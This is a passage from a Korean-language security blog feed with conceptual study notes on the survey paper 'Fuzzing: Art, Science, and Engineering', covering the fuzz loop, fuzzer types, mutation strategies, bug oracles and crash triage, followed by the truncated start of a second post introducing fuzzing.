id="0-6-Fuzz-Configuration"><a href="#0-6-Fuzz-Configuration" class="headerlink" title="0-6. Fuzz Configuration"></a>0-6. Fuzz Configuration</h3><blockquote><p>Definition 2.6 (Fuzz Configuration).<br>A fuzz configuration of a fuzz algorithm comprises the parameter value(s) that control(s) the fuzz algorithm.</p></blockquote><ul><li>퍼즈 환경설정은 퍼즈 알고리즘을 제어하는 파라미터 값들을 포함한다.</li><li>보통 튜플(Tuple) 형태로 작성된다.</li></ul><h3 id="0-7-Seed-Data"><a href="#0-7-Seed-Data" class="headerlink" title="0-7. Seed Data"></a>0-7. Seed Data</h3><ul><li>Input data를 만들 때 원인이 되는 Seed 파일이다.</li></ul><h3 id="0-8-Seed-Trimming-Crash-Minimization"><a href="#0-8-Seed-Trimming-Crash-Minimization" class="headerlink" title="0-8. Seed Trimming (Crash Minimization)"></a>0-8. Seed Trimming (Crash Minimization)</h3><ul><li>크래쉬가 터졌을 때 그 조건을 만족하는 Input을 최소화 하는 행위이다.</li></ul><h3 id="0-9-Mutation"><a href="#0-9-Mutation" class="headerlink" title="0-9. Mutation"></a>0-9. Mutation</h3><ul><li>Seed data의 값을 변조하는 행위이다.</li></ul><h3 id="0-10-Input-data-Test-Case"><a href="#0-10-Input-data-Test-Case" class="headerlink" title="0-10. Input data (Test Case)"></a>0-10. Input data (Test Case)</h3><ul><li>Mutation을 통해 만들어진 데이터로 Fuzzing의 최초 정의에서 의 Fuzz된 입력 값을 뜻한다.</li></ul><hr><h2 id="1-Fuzz-Testing-Algorithm"><a href="#1-Fuzz-Testing-Algorithm" class="headerlink" title="1. Fuzz Testing Algorithm"></a>1. Fuzz Testing Algorithm</h2><p><img src="https://user-images.githubusercontent.com/49066484/138784004-d7626bb5-5ba4-482f-9a17-61824fb81547.png" alt="Fuzzing%20Art,%20Science,%20and%20Engineering%20c48514ac84f24850b5177761eac9ca66/_.png"></p><ul><li>Input 값으로 퍼즈 환경설정(C)와 타임아웃(t_limit)이 있고, 발견된 버그의 집합 (B)를 Output으로 반환한다.</li><li>전처리 단계 Preprocess 함수 호출 후, 반복문 안에서 Schedule, InputGen, InputEval, ConfUpdate, Continue 함수들이 수행된다.</li><li>각 루프를 수행하는 것을 ‘Fuzz iteration’이라 하고, 하나의 테스트 케이스에 대해 Input Eval이 수행되는 것을 ‘Fuzz run’이라 한다.</li><li>단, 모든 퍼저가 이러한 5개의 함수들을 포함하는 것은 아니다.</li></ul><h3 id="1-1-Preprocess-C-→-C"><a href="#1-1-Preprocess-C-→-C" class="headerlink" title="1-1. Preprocess(C) → C"></a>1-1. Preprocess(C) → C</h3><ul><li>전처리 단계에서는 사용자가 퍼즈 환경설정으로 사용할 값들을 지정하면, 이를 적절히 수정한 상태로 다시 반환하게 된다.</li></ul><h3 id="1-2-Schedule-C-t-elapsed-t-limit-→-conf"><a href="#1-2-Schedule-C-t-elapsed-t-limit-→-conf" class="headerlink" title="1-2. Schedule(C, t_elapsed, t_limit) → conf"></a>1-2. Schedule(C, t_elapsed, t_limit) → conf</h3><ul><li>Schedule 함수는 현재의 퍼즈 환경설정(C) 집합과, 수행 시간 (t_elapsed), 종료 시점(t_limit)을 입력 값으로 하여, 이번 fuzz iteration에서 사용할 특정 설정 값 conf를 지정한다.</li></ul><h3 id="1-3-InputGen-conf-→-tcs"><a href="#1-3-InputGen-conf-→-tcs" class="headerlink" title="1-3. InputGen(conf) → tcs"></a>1-3. InputGen(conf) → tcs</h3><ul><li>InputGen 함수는 퍼즈 환경설정을 토대로 구체적인 테스트 케이스의 집합(tcs)을 생성한다. 테스트 케이스를 생성할 때에는 현재 conf에 설정된 특정 파라미터들을 이용한다. 일부 퍼저는 Seed 방식을 사용하기도 하고, 나머지는 Model 또는 Grammar를 파라미터로 사용하기도 한다.</li></ul><h3 id="1-4-InputEval-conf-tcs-O-bug-→-B’-execinfos"><a href="#1-4-InputEval-conf-tcs-O-bug-→-B’-execinfos" class="headerlink" title="1-4. InputEval(conf, tcs, O_bug) → B’, execinfos"></a>1-4. InputEval(conf, tcs, O_bug) → B’, execinfos</h3><ul><li>InputEval함수는 퍼즈 환경설정과, 테스트 케이스, 그리고 버그 오라클을 입력으로 받는다. 이 단계에서 테스트 케이스를 대상 프로그램에 주입한 후, 해당 실행 과정에서 보안 정책 위반이 발생 하는지를 버그 오라클을 사용하여 점검한다. 이때 버그가 발견되었다면 그 버그 결과와 해당 fuzz run에서 사용된 기타 정보들(execinfos)가 반환 된다. 이때 버그 오라클은 Fuzzer 내부에 포함되어 있다고 가정한다.</li></ul><h3 id="1-5-ConfUpdate-C-conf-execinfos-→-C"><a href="#1-5-ConfUpdate-C-conf-execinfos-→-C" class="headerlink" title="1-5. ConfUpdate(C, conf, execinfos) → C"></a>1-5. ConfUpdate(C, conf, execinfos) → C</h3><ul><li>ConfUpdate 함수는 퍼즈 환경설정(C)과, 현재 설정된 값(conf), 그리고 각각의 fuzz run이 수행될 때의 관련 정보(execinfos)를 입력으로 하여, 퍼즈 환경설정(C)을 업데이트한 값을 결과로 반환한다. 예를 들어 상당수의 그레이 박스 퍼저들은 execinfos의 정보를 기반으로 퍼즈 환경설정(C)의 범위를 축소시킨다.</li></ul><h3 id="1-6-Continue-C-→-True-False"><a href="#1-6-Continue-C-→-True-False" class="headerlink" title="1-6. Continue(C) → {True, False}"></a>1-6. Continue(C) → {True, False}</h3><ul><li>Continue 함수는 퍼즈 환경설정(C)을 기반으로 하여, 다음 fuzz iteration을 수행 여부를 참과 거짓으로 판정하는 Boolean 값을 반환한다.</li></ul><hr><h2 id="2-Fuzzer-분류"><a href="#2-Fuzzer-분류" class="headerlink" title="2. Fuzzer 분류"></a>2. Fuzzer 분류</h2><ul><li>통상적인 소프트웨어 테스팅 분야에서는 크게 두 가지 (Black-box, White-box) 테스트로만 분류되지만, 퍼저는 Black, White, Grey 세 가지로 구분할 수 있다.</li><li>하지만 엄밀히 따지면 Grey-box 퍼징 역시 약간의 정보가 주어지는 상태에서 수행하므로 White-box 퍼징의 한 가지 종류에 속한다고 볼 수도 있다.</li></ul><h3 id="2-1-Black-box-Fuzzer"><a href="#2-1-Black-box-Fuzzer" class="headerlink" title="2-1. Black-box Fuzzer"></a>2-1. Black-box Fuzzer</h3><ul><li>PUT의 내부를 들여다 보지 않는다.</li><li>오직 PUT의 input과 output만을 관찰함으로써 퍼징을 진행한다.</li><li>IO-driven, Data-driven testing 이라고 부르기도 한다.</li><li>ex) SPIKE, BFF, OF, zzuf</li></ul><h3 id="2-2-White-box-Fuzzer"><a href="#2-2-White-box-Fuzzer" class="headerlink" title="2-2. White-box Fuzzer"></a>2-2. White-box Fuzzer</h3><ul><li>PUT의 내부를 알고 있다. (소스코드를 알고있거나, 바이너리 분석이 가능하다.)</li><li>Black-box 방식보다 오버헤드가 크다.</li></ul><h3 id="2-3-Grey-box-Fuzzer"><a href="#2-3-Grey-box-Fuzzer" class="headerlink" title="2-3. Grey-box Fuzzer"></a>2-3. Grey-box Fuzzer</h3><ul><li>White-box와는 달리 PUT의 전체적인 범위를 알 수는 없다.</li><li>PUT에 대한 기본적인 정보만 제공 받는다. (프로토콜 정보..)</li><li>ex) AFL, VUzzer</li></ul><hr><h2 id="3-Preprocess"><a href="#3-Preprocess" class="headerlink" title="3. Preprocess"></a>3. Preprocess</h2><ul><li>어떤 퍼저들은 첫 번째 fuzz iteration을 수행하기 전에 fuzz configuration의 초기 설정을 수정하기도 한다.</li><li>이러한 전처리 작업은 보통 PUT을 Instrumentation, Seed Selection, Seed Trimming 기법을 사용하기 위해서 사용된다.</li></ul><h3 id="3-1-Instrumentation"><a href="#3-1-Instrumentation" class="headerlink" title="3-1. Instrumentation"></a>3-1. Instrumentation</h3><ul><li>input 값에 대한 피드백을 받기 위해서 하는 행위.</li><li>White,Grey-box 퍼저들은 PUT이 fuzz run 된 Evaluation 결과에 대한 정보를 피드백하여 instrument하거나, 실행 중인 메모리 정보들을 이용해 퍼징 할 수 있다.</li><li>Process trace 나 System call trace를 사용하여 PUT 내부의 정보를 얻는 방법도 있지만, instrumentation 기법을 사용하는 이유는 그중 보다 유의미한 정보만을 취득하기 위해 사용한다.</li><li>Static : PUT을 수행하기 전의 상태를 토대로 파악한다. (소스코드가 필요하다.)</li><li>Dynamic : PUT이 수행되는 동안의 정보를 수집한다. (정적보다 오버헤드가 크다.)<ul><li>ex) DynInst, DynamoRIO, Pin, Valgrind, QEMU</li></ul></li><li>Static, Dynamic을 혼합해서 사용할 수 있다.<ul><li>AFL : 특수한 컴파일러 사용 (Static) + QEMU 사용(Dynamic)</li></ul><h3 id="3-1-1-Execution-Feedback"><a href="#3-1-1-Execution-Feedback" class="headerlink" title="3-1-1. Execution Feedback"></a>3-1-1. Execution Feedback</h3><ul><li>퍼저를 실행하면서 피드백을 받아 더욱 유익한 퍼징 실행이 될 수 있도록 하기 위한 방법.</li><li>Grey-box 퍼저는 대부분 execution feedback을 input으로 하여 test case를 발전시킨다.</li></ul><h3 id="3-1-2-In-Memory-Fuzzing"><a href="#3-1-2-In-Memory-Fuzzing" class="headerlink" title="3-1-2. In-Memory Fuzzing"></a>3-1-2. In-Memory Fuzzing</h3><ul><li>큰 바이너리를 퍼징할 때 프로그램을 계속 재시작하는 오버헤드가 발생하는데, 이를 해결하기 위해, 메모리 스냅샷을 떠두고 메모리에서 퍼징을 하고 다시 메모리만 돌리는 방법.</li><li>Crash 발생 시 아까 떠두었던 메모리 스냅샷 이용한다. (처음부터 다시 시작할 필요 없음)</li><li>하지만 똑같은 버그 발생 조건을 갖추어도 버그가 발생하지 않을 수 있다.<ul><li>(=Reproduce가 안 될 수 있음)</li></ul></li></ul><h3 id="3-1-3-Thread-Scheduling"><a href="#3-1-3-Thread-Scheduling" class="headerlink" title="3-1-3. Thread Scheduling"></a>3-1-3. Thread Scheduling</h3><ul><li>Thread 로 동작하는 프로그램의 경우 트리거가 안되는 버그가 존재 할 수 있고, Reproduce가 안될 수 있기 때문에 Thread scheduling을 instrumentation을 통해 명시적으로 해줄 수 있다.</li><li>경우에 따라 Race condition 의 취약점을 더 잘 찾아 주는 효과가 발생한다.</li></ul></li></ul><h3 id="3-2-Seed-Selection"><a href="#3-2-Seed-Selection" class="headerlink" title="3-2. Seed Selection"></a>3-2. Seed Selection</h3><ul><li>InputData를 만들 때 쓰인다.</li><li>전처리 작업에서 Seed selection이 필요한 이유는 가끔 이 seed가 엄청 많을 경우, 단순히 다양한 seed를 넣어 보는 것이 비 효율적일 수 있기 때문이다.<ul><li>이러한 문제를 seed selection problem 이라고 부른다.</li></ul></li><li>Seed Selection Problem</li><li>Minset Computation : coverage가 동일한 최소의 set을 찾는 것을 목표로한다.<ul><li>(여기서 coverage는 다양한 의미로 쓰인다.)</li><li>ex)  {s1 → {10,20}, s2 → {20,30}}. 대략 s1과 s2만큼 빠르게 실행되는 세 번째 시드 s3 → {10, 20, 30}이있는 경우, s1과 s2 대신 s3을 만드는 것이 더 효과적일 수 있다.</li></ul></li></ul><h3 id="3-3-Seed-Trimming"><a href="#3-3-Seed-Trimming" class="headerlink" title="3-3. Seed Trimming"></a>3-3. Seed Trimming</h3><ul><li>동일한 목적을 달성하는 여러 개의 Seed를 제거하기 위한 방법론이다.</li><li>Seed의 개수를 줄이는 것과 Seed의 내용을 줄이는 것을 포함한다.</li></ul><h3 id="3-4-Preparing-a-Driver-Application"><a href="#3-4-Preparing-a-Driver-Application" class="headerlink" title="3-4. Preparing a Driver Application"></a>3-4. Preparing a Driver Application</h3><ul><li>PUT을 직접적으로 퍼징 하기가 곤란한 경우, 퍼징을 위한 중간 프로그램을 준비하는 것이다.</li><li>퍼징 대상이 라이브러리인 경우, 해당 라이브러리 내부의 함수를 호출하는 드라이버 프로그램을 만들어서 퍼징한다.</li><li>퍼징 대상이 커널인 경우, userland app을 퍼징함으로써 커널을 퍼징한다.</li><li>퍼징 대상이 IoT인 경우, 스마트 어플리케이션을 드라이버로 하여  IoT장치를 퍼징한다.</li></ul><hr><h2 id="4-Scheduling"><a href="#4-Scheduling" class="headerlink" title="4. Scheduling"></a>4. Scheduling</h2><ul><li>퍼징을 할 때 설정 값을 얼마나 자주 바꿔줄 것 인가에 대한 선택 메커니즘이다.</li><li>목적은 다양한 조건을 피드백 받아 다음 Seed 선택을 용이하게 하기 위함이다.<ul><li>간단한 퍼저 일수록 스케줄링 알고리즘이 필요하지 않다.</li></ul></li></ul><h3 id="4-1-The-Fuzz-Configuration-Scheduling-FCS-Problem"><a href="#4-1-The-Fuzz-Configuration-Scheduling-FCS-Problem" class="headerlink" title="4-1. The Fuzz Configuration Scheduling (FCS) Problem"></a>4-1. The Fuzz Configuration Scheduling (FCS) Problem</h3><ul><li>근본적으로 모든 스케줄 알고리즘은 exploration과 exploitation이라는 측면에서 상충되는 문<br>제를 겪게 된다.</li><li>exploration : 나중 결정을 위해 보다 정확한 정보를 수집하는데 시간을 할애하는 것.</li><li>exploitation : 현재 가장 유리한 결과물을 얻는데 최선을 다하는 것.</li><li>이러한 문제를 FCS Problem이라 정의한다.</li></ul><h3 id="4-2-Black-box-FCS-Algorithms"><a href="#4-2-Black-box-FCS-Algorithms" class="headerlink" title="4-2. Black-box FCS Algorithms"></a>4-2. Black-box FCS Algorithms</h3><ul><li>블랙박스 퍼징의 상황에서 FCS 알고리즘이 사용할 수 있는 유일한 정보는 특정 configuration을 넣었을 때에 대한 결과값 뿐이다.</li></ul><h3 id="4-3-Grey-box-FCS-Algorithms"><a href="#4-3-Grey-box-FCS-Algorithms" class="headerlink" title="4-3. Grey-box FCS Algorithms"></a>4-3. Grey-box FCS Algorithms</h3><ul><li>블랙박스 보다 많은 정보를 가지고 피드백 받을 수 있다.</li><li>fuzz configuration의 coverage 범위와 같은 정보의 집합을 이용한다.</li><li>각각의 알고리즘은 최대의 효율을 가지기 위해 각자의 알고리즘을 사용하고 있다.<ul><li>시드 적합성, 시드선택, 시드의 유용성 등을 고려.</li><li>좋은 시드들을 군집화 하여 테스팅에 가중치를 줌 (동일한 가중치 일 때는 작은 시드를 선호)</li></ul></li></ul><h3 id="4-4-White-box-FCS-Algorithms"><a href="#4-4-White-box-FCS-Algorithms" class="headerlink" title="4-4. White-box FCS Algorithms"></a>4-4. White-box FCS Algorithms</h3><ul><li>심볼릭 익스큐션 등 굉장히 복잡하다. (논문에서 생략)</li></ul><hr><h2 id="5-Input-Generation"><a href="#5-Input-Generation" class="headerlink" title="5. Input Generation"></a>5. Input Generation</h2><ul><li>테스트 케이스를 통해 전달되는 데이터의 내용이 곧바로 버그를 발생 시키는 지의 여부와 직접적인 연관이 있기 때문에, 어떠한 입력 값을 만들어내는지를 주관하는 기술은 Fuzzer의 가장 핵심적인 설계 요소라고 할 수 있다.</li><li>Generation-based 방식과 Mutation-based 방식으로 나뉜다.</li><li>Generation-based : PUT이 처리할 수 있는 입력 값 데이터에 대한 모델을 주고<br>이를 기반으로 새로운 테스트 케이스를 만들도록 한다. (Model-based)</li><li>Mutation-based : 주어진 Seed를 기반으로 하여 약간의 변이를 주면서 다음 테스트 케이스를 만들도록 한다. (Model-less)</li></ul><h3 id="5-1-Model-based-Generation-based-Fuzzers"><a href="#5-1-Model-based-Generation-based-Fuzzers" class="headerlink" title="5-1. Model-based(Generation-based) Fuzzers"></a>5-1. Model-based(Generation-based) Fuzzers</h3><ul><li>모델 기반 퍼지는 PUT이 수용할 수 있는 입력 또는 실행을 설명하는 주어진 모델을 기반으<br>로 테스트 케이스를 생성한다.</li></ul><h3 id="5-1-1-Predefined-Model"><a href="#5-1-1-Predefined-Model" class="headerlink" title="5-1-1. Predefined Model"></a>5-1-1. Predefined Model</h3><ul><li>사전 정의에 따른 모델은 보통 사용자가 직접 관련된 설정 값을 지정하도록 한다.</li><li>분석가가 EBNF와 같은 문법으로 해당 프로그램의 입력 값 또는 프로토콜의 명세 알맞은 모델링을 수행하여 지정한다.</li></ul><h3 id="5-1-2-Inferred-Model"><a href="#5-1-2-Inferred-Model" class="headerlink" title="5-1-2. Inferred Model"></a>5-1-2. Inferred Model</h3><ul><li>사전 정의된 로직 또는 사용자 제공 모델에 의존하는 것보다는 모델을 스스로 추론하는 것<br>이 최근에 주목을 받고 있다.</li><li>모델 추론은 Preprocess 단계 혹은 ConfUpdate 단계에서 적용될 수 있다.</li></ul><h3 id="5-2-Model-less-Mutation-based-Fuzzers"><a href="#5-2-Model-less-Mutation-based-Fuzzers" class="headerlink" title="5-2. Model-less(Mutation-based) Fuzzers"></a>5-2. Model-less(Mutation-based) Fuzzers</h3><ul><li>PUT의 입력 값을 seed로 하여 그 seed 값을 mutate 하는 방식으로 새로운 테스트 케이스를 만드는 것이 대부분의 Model-less 퍼저들이 수행하는 방식이다.</li><li>이때 seed 들은 PUT에 적용될 수 있도록 구조화가 잘 되어 있는 것이며, 파일, 네트워크 패킷, 일련의 UI 이벤트들이 될 수 있다.</li><li>유효한 파일이 주어지면 그것의 일부분만을 살짝 변경함으로써, 나머지 대부분의 내용은 여전히 유효하지만 일부분의 비정상 값에 의해 PUT의 충돌을 유발하도록 하는 테스트 케이스를 만드는 것을 목표로 한다.</li></ul><h3 id="5-2-1-Bit-Flipping"><a href="#5-2-1-Bit-Flipping" class="headerlink" title="5-2-1. Bit-Flipping"></a>5-2-1. Bit-Flipping</h3><ul><li>고정된 몇 개의 bit를 변경하거나, 그 개수마저 무작위로 변경하는 방식이다.</li><li>mutation ratio를 사용자가 parameter로 지정하도록 하기도 한다.</li></ul><h3 id="5-2-2-Arithmetic-Mutation"><a href="#5-2-2-Arithmetic-Mutation" class="headerlink" title="5-2-2. Arithmetic Mutation"></a>5-2-2. Arithmetic Mutation</h3><ul><li>AFL이나 honggfuzz는 정수의 byte sequence 일부를 찾아서 그 부분을 치환한다.<ul><li>예를 들어 i라는 값을 i ± r로 바꾸는데 이때 r은 0 &lt;= r &lt;35에 해당하도록 한다.</li></ul></li></ul><h3 id="5-2-3-Block-based-Mutation"><a href="#5-2-3-Block-based-Mutation" class="headerlink" title="5-2-3. Block-based Mutation"></a>5-2-3. Block-based Mutation</h3><ul><li>시드의 byte sequence를 block이라고 정의한다.</li><li>해당 seed에서 무작위적인 위치에 새로운 block을 삽입하거나 기존 block을 일부 삭제하는 등의 방법이다.</li><li>그 외에 블록 내용을 변경하거나 순열의 조합을 변경, 덧붙이기, 짜깁기 등의 변형 또한 가능하다.</li><li>시드를 특정 블럭으로 나눌 수 있는 경우 블럭을 나열하고 거기서 블럭들을 기반으로 삽입, 삭제, 대체 등을 한다.(radamsa)</li></ul><h3 id="5-2-4-Dictionary-based-Mutation"><a href="#5-2-4-Dictionary-based-Mutation" class="headerlink" title="5-2-4. Dictionary-based Mutation"></a>5-2-4. Dictionary-based Mutation</h3><ul><li>실제로 개발자들이 실수를 많이 할 수 있는 산술 연산 오류 포인트를 노린다.</li><li>-1 , 0 , 1 등을 정의해 놓고 이 숫자 값을 우선적으로 대입한다.</li></ul><h3 id="5-3-White-box-Fuzzers"><a href="#5-3-White-box-Fuzzers" class="headerlink" title="5-3. White-box Fuzzers"></a>5-3. White-box Fuzzers</h3><ul><li>White-box 역시 model-based 방법이나 model-less 방법을 적용하는 것이 가능하다.</li><li>보통 dynamic symbolic execution을 통해 테스트 케이스를 만든다.</li></ul><h3 id="5-3-1-Dynamic-Symbolic-Execution"><a href="#5-3-1-Dynamic-Symbolic-Execution" class="headerlink" title="5-3-1. Dynamic Symbolic Execution"></a>5-3-1. Dynamic Symbolic Execution</h3><ul><li>여러가지 방식이 있으나 일반적으로 basic block 단위로 움직인다.</li><li>branch를 만나면 상태 값을 저장하고, fork 시켜 경우의 수를 나누어 모든 경로를 탐색한다.</li><li>BFS, DFS 두가지 방식으로 path를 탐색할 수 있다.</li><li>fully symbolic 은 일반 바이너리에서 어렵다.</li><li>각각의 branch를 통과하기 위한 값을 찾기 위해 일반적으로 SMT solver를 사용한다.</li></ul><h3 id="5-3-2-Guided-Fuzzing"><a href="#5-3-2-Guided-Fuzzing" class="headerlink" title="5-3-2. Guided Fuzzing"></a>5-3-2. Guided Fuzzing</h3><ul><li>퍼징의 확률을 높이기 위해 특정 부분까지 직접 리버싱을 해서 해를 찾아가는 방법이다.</li><li>어느 정도 해를 찾아 퍼징을 할 포인트를 잡아주고 거기서부터 퍼징을 하는 방식이다.<ul><li>ex) TaintScope, Dowser</li></ul></li></ul><h3 id="5-3-3-PUT-Mutation"><a href="#5-3-3-PUT-Mutation" class="headerlink" title="5-3-3. PUT Mutation"></a>5-3-3. PUT Mutation</h3><ul><li>checksum 검사가 있는 경우 모든 데이터가 통과할 수 없기 때문에 바이너리 패치를 통하여 이러한 부분을 무조건 넘기도록 하고 퍼징을 진행한다.</li></ul><hr><h2 id="6-Input-Evaluation"><a href="#6-Input-Evaluation" class="headerlink" title="6. Input Evaluation"></a>6. Input Evaluation</h2><ul><li>퍼징을 수행후에 위반이 일어났는지 안났는지를 판단하기 위한 행위이다.</li><li>단순하게 처리하는 방법도 있지만, 최적화 방법론, 퍼징 효율 등을 고려할 수 있다.</li></ul><h3 id="6-1-Bug-oracle"><a href="#6-1-Bug-oracle" class="headerlink" title="6-1. Bug oracle"></a>6-1. Bug oracle</h3><ul><li>버그 오라클이란 해당 프로그램 수행이 버그를 내포하고 있는지 아닌지를 결정한다.</li><li>sanitizer는 unsafe하거나 unwanted한 프로그램의 동작이 보이는 즉시 강제로 abort를 발생시키는 기법이다.</li></ul><h3 id="6-1-1-Memory-and-Type-safety"><a href="#6-1-1-Memory-and-Type-safety" class="headerlink" title="6-1-1. Memory and Type safety"></a>6-1-1. Memory and Type safety</h3><ul><li>메모리의 유효한 바운더리를 두고 이 경계를 넘는지를 탐지하는 방식.</li><li>Spatial : 특정 객체가 의도하지 않은 대상의 외부에서 포인터 역참조가 발생할 때.<ul><li>Overflow</li></ul></li><li>Temporal : 더 이상 유효하지 않은 포인터에 접근하게 될 때.<ul><li>Use-after-free</li></ul></li></ul><h3 id="6-1-2-Undefined-behaviors"><a href="#6-1-2-Undefined-behaviors" class="headerlink" title="6-1-2. Undefined behaviors"></a>6-1-2. Undefined behaviors</h3><ul><li>컴파일러 최적화 설정, 아키텍처, 컴파일 버전으로 인하여 생기는 예상치 못한 행동.</li></ul><h3 id="6-1-3-Input-validation"><a href="#6-1-3-Input-validation" class="headerlink" title="6-1-3. Input validation"></a>6-1-3. Input validation</h3><ul><li>입력 값 확인.</li><li>XSS나 SQL injection과 같은 취약점들은 모두 주어진 입력 값에 대한 검증을 제대로 수행하지 않았을 때 발생한다.</li></ul><h3 id="6-1-4-Semantic-Difference-differential-testing"><a href="#6-1-4-Semantic-Difference-differential-testing" class="headerlink" title="6-1-4. Semantic Difference (differential testing)"></a>6-1-4. Semantic Difference (differential testing)</h3><ul><li>주어진 두 개 이상의 다른 INPUT으로 출력 간의 차이를 두어 비교 분석한다.</li></ul><h3 id="6-2-Execution-Optimizations"><a href="#6-2-Execution-Optimizations" class="headerlink" title="6-2. Execution Optimizations"></a>6-2. Execution Optimizations</h3><ul><li>반복적인 로딩 프로세스를 건너 뛸 수 있도록 구현하는 것.</li><li>PUT을 매번 프로세스 재 가동 시키게 하는 것은 굉장한 부하를 유발한다.</li></ul><h3 id="6-3-Triage"><a href="#6-3-Triage" class="headerlink" title="6-3. Triage"></a>6-3. Triage</h3><ul><li>보안 정책 위반을 촉발한 해당 테스트 케이스에 대하여 분석하고 리포트하는 작업<br>이다.</li><li>결과의 중복 제거, 우선순위 지정, 테스트 케이스 최소화 작업을 진행한다.</li></ul><h3 id="6-3-1-Deduplication"><a href="#6-3-1-Deduplication" class="headerlink" title="6-3-1. Deduplication"></a>6-3-1. Deduplication</h3><ul><li>동일한 버그를 유발하는 다수의 테스트 케이스를 식별하여 이를 제거하는 것이다.</li><li>각각의 unique bug만을 촉발하는 고유한 test case의 집합만을 남겨두는 것이다.</li><li>분석 시간을 절약 할 수 있으며, 컴퓨터 리소스를 절약 할 수 있다.</li><li>Stack Backtrace hashing : 가장 고전적인 방식으로 backtrace를 통하여 stack 호출 순서를 hasing하여 비교하는 방식, 힙메모리 커럽션에 대한 유니크 크래시를 구분할 수가 없다.</li><li>Coverage-based Deduplication : 크래시가 났을때 동일한 코드에서 터졌는지 확인 하는 방법. (Ex. AFL)</li><li>Semantics-aware Deduplication : core dump의 내용을 분석하고, 어떤 instruction이 bad value를 할당하였는지를 찾아내는 것이다.</li></ul><h3 id="6-3-2-Prioritization-and-Exploitability"><a href="#6-3-2-Prioritization-and-Exploitability" class="headerlink" title="6-3-2. Prioritization and Exploitability"></a>6-3-2. Prioritization and Exploitability</h3><ul><li>unique 한지 보는 것이 아니라 취약점이 악용될 수 있는 지를 판단한다. (Ex. !Exploitable)</li><li>EXPLOITABLE&gt; PROBABLY_EXPLOITABLE&gt; UNKNOWN&gt; NOT_LIKELY_EXPLOITABLE</li><li>결과가 정확하지 않다는 단점이 크다.</li></ul><h3 id="6-3-3-Test-case-minimization"><a href="#6-3-3-Test-case-minimization" class="headerlink" title="6-3-3. Test case minimization"></a>6-3-3. Test case minimization</h3><ul><li>테스트 케이스 중 실제로 보안정책을 위반하게 되는 직접적인 원인 만을 남겨둔 채 기타 부가적인 요소들은 최소화하는 것이다.</li><li>seed trimming과 유사한 개념으로, 입력 값의 사이즈를 줄이려는 시도이다. 테스트 케이스를 최소화 시킴으로써 버그 오라클의 성능을 향상 시킬 수 있다.</li></ul><hr><h2 id="7-Configuration-Update"><a href="#7-Configuration-Update" class="headerlink" title="7. Configuration Update"></a>7. Configuration Update</h2><ul><li>ConfUpdate 단계는 블랙박스 테스팅을 다른 화이트, 그레이 박스 테스팅과 구분 짓는 가장<br>중요한 지표이다.</li><li>블랙박스 퍼저의 경우 프로그램으로부터 어떠한 버그가 발생했는지, 버그 발생에 따라 어떠한 introspection 정보를 얻을 수가 없기 때문에 configuration을 딱히 수정할 수가 없다.</li><li>그레이 박스나 화이트 박스 퍼저들은 보다 정확하게 confupdate를 하도록 구현되어 있다.</li></ul><h3 id="7-1-Evolutionary-Seed-Pool-Update"><a href="#7-1-Evolutionary-Seed-Pool-Update" class="headerlink" title="7-1. Evolutionary Seed Pool Update"></a>7-1. Evolutionary Seed Pool Update</h3><ul><li>Evolutionary Algorithm(EA)는 생물학적 진화 이론에 등장하는 돌연변이, 재조합, 선택설 등의 휴리스틱 기반의 접근법이다.</li><li>퍼징의 맥락에서는 적절한 seed pool을 구성하기 위해 EA를 적용한다.</li><li>대부분 ConfUPdate 단계에서 새로운 conf를 설정 할 때, 노드 혹은 브랜치 coverage를 계산하여 특정 테스트케이스에 의해 새로운 노드나 브랜치가 발견되는지를 찾는 방법을 사용한다.</li></ul><h3 id="7-2-Maintaining-a-Minset"><a href="#7-2-Maintaining-a-Minset" class="headerlink" title="7-2. Maintaining a Minset"></a>7-2. Maintaining a Minset</h3><ul><li>coverage를 최대치로 만족 시키는 test case의 최소 집합만을 구하는 것이다.</li><li>config가 지나치게 많아지는 것을 방지하기 위함이다.</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>Manes, Valentin JM, et al. “Fuzzing: Art, science, and engineering.” arXiv preprint arXiv:1812.00140 (2018).</li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/25/2021-10-26-FuzzingART/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>What The Fuzz! (WTF)</title>
      <link>https://pwnkidhn.github.io/2021/10/20/2021-10-21-WTF/</link>
      <guid>https://pwnkidhn.github.io/2021/10/20/2021-10-21-WTF/</guid>
      <pubDate>Wed, 20 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;What the fuzz 간단 정리 &lt;/center&gt;

&lt;h2 id=&quot;What-is-Fuzzing&quot;&gt;&lt;a href=&quot;#What-is-Fuzzing&quot; class=&quot;headerlink&quot; title=&quot;What is Fuzzing?&quot;&gt;&lt;/a&gt;What is Fuzzing?&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Fuzzing or fuzz testing은 프로그램 내 잠재적 취약점을 찾는데 사용되는 자동화된 SW 기술.&lt;/li&gt;
&lt;li&gt;Input이 있는 모든 SW는 Fuzzed 될 수 있음.&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>What the fuzz 간단 정리 </center><h2 id="What-is-Fuzzing"><a href="#What-is-Fuzzing" class="headerlink" title="What is Fuzzing?"></a>What is Fuzzing?</h2><ul><li>Fuzzing or fuzz testing은 프로그램 내 잠재적 취약점을 찾는데 사용되는 자동화된 SW 기술.</li><li>Input이 있는 모든 SW는 Fuzzed 될 수 있음.</li></ul><span id="more"></span><h2 id="Why-Fuzzing"><a href="#Why-Fuzzing" class="headerlink" title="Why Fuzzing?"></a>Why Fuzzing?</h2><ul><li>Manual Testing시 tester의 역량에 따라 결과가 달라짐.</li><li>사람이 못하는 취약점을 찾을 수 있다.</li><li>Application이 복잡할 수록 attack surface가 많아지지만, 사람이 테스트 하기에 어려움.</li><li>이미 알려진 취약점이 다시 나오지 않도록 Regression testing 하는 데 사용.</li></ul><h2 id="Common-issues-with-fuzzing"><a href="#Common-issues-with-fuzzing" class="headerlink" title="Common issues with fuzzing"></a>Common issues with fuzzing</h2><ul><li>원하는 종류의 취약점을 발견하는데 까지 시간이 오래 걸릴 수 있다.</li><li>Smart Fuzzer(Input 구조를 알고 있는)를 사용하는데 몇 가지 작업이 좀 필요하다.</li><li>아무리 